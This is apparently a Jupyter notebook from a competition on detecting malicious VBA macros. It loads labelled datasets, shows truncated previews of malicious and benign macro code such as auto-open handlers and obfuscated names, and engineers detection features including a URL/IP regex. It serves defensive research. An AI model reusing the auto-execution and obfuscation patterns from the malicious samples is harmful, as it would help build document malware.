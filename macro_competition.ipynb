{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "c896a19f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import numpy as np\n",
    "from sklearn.feature_extraction.text import CountVectorizer\n",
    "from sklearn.feature_extraction.text import TfidfVectorizer \n",
    "from sklearn.feature_selection import VarianceThreshold\n",
    "from sklearn.feature_selection import SelectKBest, chi2\n",
    "from sklearn.ensemble import ExtraTreesClassifier\n",
    "from sklearn.feature_selection import SelectFromModel\n",
    "from sklearn.decomposition import PCA\n",
    "import re\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "%matplotlib inline"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80698d39",
   "metadata": {},
   "source": [
    "# Preprocessing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "a7654766",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>vba_code</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Private Sub getCIA(C As String, I As String, A...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Private Sub Workbook_Open()\\n    Application.C...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>'APMP\\n'KILL\\nPrivate Sub Document_Open()\\n   ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Private Sub Workbook_Activate()\\n    Call AddM...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Private Sub CheckBox1_Click()\\n\\nEnd Sub\\n\\nPr...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10625</th>\n",
       "      <td>Private Sub CommandButton1_Click()\\nDim s As A...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10626</th>\n",
       "      <td>Sub AutoOpen()\\n\\nMyMacro\\n\\nEnd Sub\\n\\nSub Do...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10627</th>\n",
       "      <td>Private Sub CommandButton1_Click()\\n    With A...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10628</th>\n",
       "      <td>Private Const FOSMgcqLTaUItxmhNrJ As String = ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10629</th>\n",
       "      <td>Private Sub Workbook_Open()\\nWorksheets(\"Home\"...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>10630 rows × 1 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                vba_code\n",
       "0      Private Sub getCIA(C As String, I As String, A...\n",
       "1      Private Sub Workbook_Open()\\n    Application.C...\n",
       "2      'APMP\\n'KILL\\nPrivate Sub Document_Open()\\n   ...\n",
       "3      Private Sub Workbook_Activate()\\n    Call AddM...\n",
       "4      Private Sub CheckBox1_Click()\\n\\nEnd Sub\\n\\nPr...\n",
       "...                                                  ...\n",
       "10625  Private Sub CommandButton1_Click()\\nDim s As A...\n",
       "10626  Sub AutoOpen()\\n\\nMyMacro\\n\\nEnd Sub\\n\\nSub Do...\n",
       "10627  Private Sub CommandButton1_Click()\\n    With A...\n",
       "10628  Private Const FOSMgcqLTaUItxmhNrJ As String = ...\n",
       "10629  Private Sub Workbook_Open()\\nWorksheets(\"Home\"...\n",
       "\n",
       "[10630 rows x 1 columns]"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test_df = pd.read_csv(\"test_dataset_without_labels.csv\", encoding='utf-16-le')\n",
    "test_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "20be408e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "vba_code    0\n",
       "dtype: int64"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test_df.isnull().sum()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "bca783c6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>vba_code</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>mal</td>\n",
       "      <td>Function SleekM()\\nOn Error Resume Next\\n   Se...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>white</td>\n",
       "      <td>'Sub AutoExec() 'ð\u00052\u0006¾\u0002(\u0002\\n'ds = MsgBox(\"#\u0001Wzh...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>white</td>\n",
       "      <td>Private Sub CommandButton1_Click()\\nCall Clear...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10624</th>\n",
       "      <td>mal</td>\n",
       "      <td>Sub Auto_Open()\\nApplication.EnableCancelKey =...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10625</th>\n",
       "      <td>white</td>\n",
       "      <td>Private Sub UserForm_Initialize()\\nTXTpath = \"...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10626</th>\n",
       "      <td>white</td>\n",
       "      <td>Private Sub SpinButton1_Change()\\n\\nEnd Sub\\n\\...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10627</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10628</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\nSub Blattschutz()\\nDim i As I...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>10629 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       label                                           vba_code\n",
       "0        mal  Function SleekM()\\nOn Error Resume Next\\n   Se...\n",
       "1        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "2      white  'Sub AutoExec() 'ð\u00052\u0006¾\u0002(\u0002\\n'ds = MsgBox(\"#\u0001Wzh...\n",
       "3      white  Private Sub CommandButton1_Click()\\nCall Clear...\n",
       "4        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "...      ...                                                ...\n",
       "10624    mal  Sub Auto_Open()\\nApplication.EnableCancelKey =...\n",
       "10625  white  Private Sub UserForm_Initialize()\\nTXTpath = \"...\n",
       "10626  white  Private Sub SpinButton1_Change()\\n\\nEnd Sub\\n\\...\n",
       "10627    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "10628  white  Option Explicit\\nSub Blattschutz()\\nDim i As I...\n",
       "\n",
       "[10629 rows x 2 columns]"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "validation_df = pd.read_csv(\"validation_dataset.csv\", encoding='utf-16-le')\n",
    "validation_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "5b45b652",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "label       0\n",
       "vba_code    0\n",
       "dtype: int64"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "validation_df.isnull().sum()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "5f4a61ce",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>vba_code</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>white</td>\n",
       "      <td>Private Sub Workbook_BeforeClose(Cancel As Boo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\nOption Explicit\\nOption Expli...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31883</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31884</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub Workbook_Open()...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31885</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub CFixPicture_Act...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31886</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31887</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>31888 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       label                                           vba_code\n",
       "0      white  Private Sub Workbook_BeforeClose(Cancel As Boo...\n",
       "1      white  Option Explicit\\nOption Explicit\\nOption Expli...\n",
       "2        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "3        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "4        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "...      ...                                                ...\n",
       "31883    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "31884  white  Option Explicit\\n\\nPrivate Sub Workbook_Open()...\n",
       "31885  white  Option Explicit\\n\\nPrivate Sub CFixPicture_Act...\n",
       "31886    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "31887    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "\n",
       "[31888 rows x 2 columns]"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df = pd.read_csv(\"train_dataset.csv\", encoding='utf-16-le')\n",
    "train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "d497a21c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "label       0\n",
       "vba_code    0\n",
       "dtype: int64"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df.isnull().sum()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "e0c45b94",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['mal', 'white'], dtype=object)"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "np.unique(train_df.label) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "d3689d1c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0        Private Sub Workbook_BeforeClose(Cancel As Boo...\n",
       "1        Option Explicit\\nOption Explicit\\nOption Expli...\n",
       "2        'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "3        'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "4        'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "                               ...                        \n",
       "31883    'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "31884    Option Explicit\\n\\nPrivate Sub Workbook_Open()...\n",
       "31885    Option Explicit\\n\\nPrivate Sub CFixPicture_Act...\n",
       "31886    'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "31887    'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "Name: vba_code, Length: 31888, dtype: object"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df.vba_code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "3647b74a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# train_df.vba_code[2]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "79c7cd2c",
   "metadata": {},
   "outputs": [],
   "source": [
    "def tfidf_features(data, n_grams=2):   \n",
    "    vectorizer = TfidfVectorizer(ngram_range=(n_grams, n_grams)) \n",
    "    X = vectorizer.fit_transform(data)\n",
    "\n",
    "    print(\"Feature names with n-gram word: \", vectorizer.get_feature_names_out())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "ac0cbbcb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Feature names with n-gram word:  ['00 00' '00 000' '00 0000' ... 'ÿâ cz' 'ÿån nn' 'ÿånnxýoïk kð']\n"
     ]
    }
   ],
   "source": [
    "# not good with big data\n",
    "tfidf_features(train_df.vba_code, 2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "861d908c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "label_counts = train_df['label'].value_counts()\n",
    "label_counts.plot(kind='bar', color=['red', 'blue'])\n",
    "plt.title('Distribution of Labels')\n",
    "plt.xlabel('Label')\n",
    "plt.ylabel('Count')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "0441ff20",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "       label                                           vba_code\n",
      "3        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
      "4        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
      "7        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
      "15       mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
      "18       mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
      "...      ...                                                ...\n",
      "31882    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
      "31883    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
      "31884  white  Option Explicit\\n\\nPrivate Sub Workbook_Open()...\n",
      "31886    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
      "31887    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
      "\n",
      "[24489 rows x 2 columns]\n"
     ]
    }
   ],
   "source": [
    "duplicates = train_df[train_df.duplicated()]\n",
    "\n",
    "if duplicates.shape[0] > 0:\n",
    "    print(duplicates)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "be20eb58",
   "metadata": {},
   "outputs": [],
   "source": [
    "# # Remove all duplicate rows based on all columns\n",
    "# train_df.drop_duplicates(inplace=True)\n",
    "\n",
    "# # If you want to remove duplicates based on specific columns, you can use the subset parameter\n",
    "# # For example, to remove duplicates based on the 'vba_code' column:\n",
    "# train_df.drop_duplicates(subset=['vba_code'], inplace=True)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "ecfda35f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# # Assuming 'label' is the column containing 'mal' and 'white' values\n",
    "# label_counts = train_df['label'].value_counts()\n",
    "\n",
    "# # Plotting the counts\n",
    "# label_counts.plot(kind='bar', color=['red', 'blue'])\n",
    "# plt.title('Distribution of Labels')\n",
    "# plt.xlabel('Label')\n",
    "# plt.ylabel('Count')\n",
    "# plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4e5606c9",
   "metadata": {},
   "source": [
    "### Extracting features"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "b56b3f34",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>vba_code</th>\n",
       "      <th>vba_code_without_comments</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>white</td>\n",
       "      <td>Private Sub Workbook_BeforeClose(Cancel As Boo...</td>\n",
       "      <td>Private Sub Workbook_BeforeClose(Cancel As Boo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\nOption Explicit\\nOption Expli...</td>\n",
       "      <td>Option Explicit\\nOption Explicit\\nOption Expli...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31883</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31884</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub Workbook_Open()...</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub Workbook_Open()...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31885</th>\n",
       "      <td>white</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub CFixPicture_Act...</td>\n",
       "      <td>Option Explicit\\n\\nPrivate Sub CFixPicture_Act...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31886</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31887</th>\n",
       "      <td>mal</td>\n",
       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>31888 rows × 3 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       label                                           vba_code  \\\n",
       "0      white  Private Sub Workbook_BeforeClose(Cancel As Boo...   \n",
       "1      white  Option Explicit\\nOption Explicit\\nOption Expli...   \n",
       "2        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "3        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "4        mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "...      ...                                                ...   \n",
       "31883    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "31884  white  Option Explicit\\n\\nPrivate Sub Workbook_Open()...   \n",
       "31885  white  Option Explicit\\n\\nPrivate Sub CFixPicture_Act...   \n",
       "31886    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "31887    mal  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "\n",
       "                               vba_code_without_comments  \n",
       "0      Private Sub Workbook_BeforeClose(Cancel As Boo...  \n",
       "1      Option Explicit\\nOption Explicit\\nOption Expli...  \n",
       "2      \\nPrivate Sub Workbook_BeforeClose(Cancel As B...  \n",
       "3      \\nPrivate Sub Workbook_BeforeClose(Cancel As B...  \n",
       "4      \\nPrivate Sub Workbook_BeforeClose(Cancel As B...  \n",
       "...                                                  ...  \n",
       "31883  \\nPrivate Sub Workbook_BeforeClose(Cancel As B...  \n",
       "31884  Option Explicit\\n\\nPrivate Sub Workbook_Open()...  \n",
       "31885  Option Explicit\\n\\nPrivate Sub CFixPicture_Act...  \n",
       "31886  \\nPrivate Sub Workbook_BeforeClose(Cancel As B...  \n",
       "31887  \\nPrivate Sub Workbook_BeforeClose(Cancel As B...  \n",
       "\n",
       "[31888 rows x 3 columns]"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Remove comments\n",
    "train_df['vba_code_without_comments'] = train_df['vba_code'].apply(lambda x: re.sub(r\"'.*?$\", \"\", x, flags=re.MULTILINE))\n",
    "train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "9b358c57",
   "metadata": {},
   "outputs": [],
   "source": [
    "# make one clean line\n",
    "def clean_script(script):\n",
    "    # Remove special characters and reduce consecutive spaces\n",
    "    cleaned_script = re.sub(r'\\s+', ' ', script)\n",
    "    # Remove tabs and newlines\n",
    "    cleaned_script = cleaned_script.replace('\\t', '').replace('\\n', '')\n",
    "    # Remove punctuation and convert to lowercase\n",
    "    cleaned_script = re.sub(r'[^\\w\\s]', '', cleaned_script).lower()\n",
    "    return cleaned_script"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "3d629d68",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Apply the cleaning function to the 'vba_code' column\n",
    "train_df['cleaned_vba_code'] = train_df['vba_code_without_comments'].apply(clean_script)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "0029096f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Text Length\n",
    "train_df['code_length'] = train_df['vba_code'].apply(len)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "b5e2c274",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Number of Linens\n",
    "train_df['num_lines'] = train_df['vba_code'].apply(lambda x: x.count('\\n') + 1)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "921728f7",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Syntax Complexity: average number of characters per line\n",
    "train_df['avg_chars_per_line'] = train_df.apply(lambda row: row['code_length'] / row['num_lines'] if row['num_lines'] > 0 else 0, axis=1)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "349c3b8d",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Use of Punctuation\n",
    "train_df['num_exclamation_marks'] = train_df.apply(lambda row: row['vba_code'].count('!') / row['code_length'] if row['code_length'] > 0 else 0, axis=1)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "93884b2f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Language Features\n",
    "train_df['num_loops'] = train_df['vba_code'].apply(lambda x: x.count('For') + x.count('While'))\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "7c0427d0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Loops per Character Length\n",
    "train_df['num_loops_length'] = train_df.apply(lambda row: (row['vba_code'].count('For ') + row['vba_code'].count('While')) / row['code_length'] if row['code_length'] > 0 else 0, axis=1)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "3255b31f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Function/Procedure Count\n",
    "train_df['num_functions'] = train_df['vba_code'].apply(lambda x: x.count('Sub ') + x.count('Function '))\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "c203070e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Functions per Character Length:\n",
    "train_df['num_functions'] = train_df.apply(lambda row: (row['vba_code'].count('Sub ') + row['vba_code'].count('Function ')) / row['code_length'] if row['code_length'] > 0 else 0, axis=1)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "35945ee8",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Numeric Literal Count (using regular expression)\n",
    "train_df['num_numeric_literals'] = train_df.apply(lambda row: len(re.findall(r'\\b\\d+\\b', row['vba_code'])) / row['code_length'] if row['code_length'] > 0 else 0, axis=1)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "599ec677",
   "metadata": {},
   "outputs": [],
   "source": [
    "# String Literal Count\n",
    "train_df['num_string_literals'] = train_df.apply(lambda row: len(re.findall(r'\"([^\"]*)\"', row['vba_code'])) / row['code_length'] if row['code_length'] > 0 else 0, axis=1)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "4c5b0be5",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Error Handling Presence\n",
    "train_df['has_error_handling'] = train_df['vba_code'].apply(lambda x: 1 if 'On Error' in x else 0)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "03ae41ae",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Define a function to check for the presence of URLs or IPs\n",
    "def has_url_or_ip(code):\n",
    "    # Regular expression pattern to match URLs or IPs\n",
    "    pattern = re.compile(r'(https?://|ftp://|www\\.)|((25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)')\n",
    "\n",
    "    # Check if the pattern is found in the code\n",
    "    return 1 if pattern.search(code) else 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "1b24863f",
   "metadata": {},
   "outputs": [],
   "source": [
    "train_df['has_url_or_ip'] = train_df['vba_code'].apply(has_url_or_ip)\n",
    "# train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "47579d29",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2        'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
       "3        'Option Explicit\\nPrivate Sub Workbook_BeforeC...\n",
